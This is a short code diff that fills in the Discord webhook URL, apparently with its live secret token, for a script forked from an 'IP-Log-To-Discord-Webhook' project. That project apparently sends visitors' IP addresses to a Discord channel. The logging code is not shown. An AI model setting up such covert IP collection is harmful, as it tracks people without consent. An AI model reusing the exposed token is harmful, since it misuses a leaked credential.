@@ -1,6 +1,6 @@
 // Paste your Discord Webhook API URL into Line 3: WEBHOOKURL => YOUR API URL
 
-var webHookUrl = "YOUR_WEBHOOK_URL_HERE";
+var webHookUrl = "https://discord.com/api/webhooks/1349648325594583143/xXptCzRDkHB2hqt6FLKgpXatN_KdwgVGfi9T43-gxyIJCJy5K3XsUJWo-dy1IDOkm1yt";
 
 /*
     Forked from: https://github.com/luisoos/IP-Log-To-Discord-Webhook
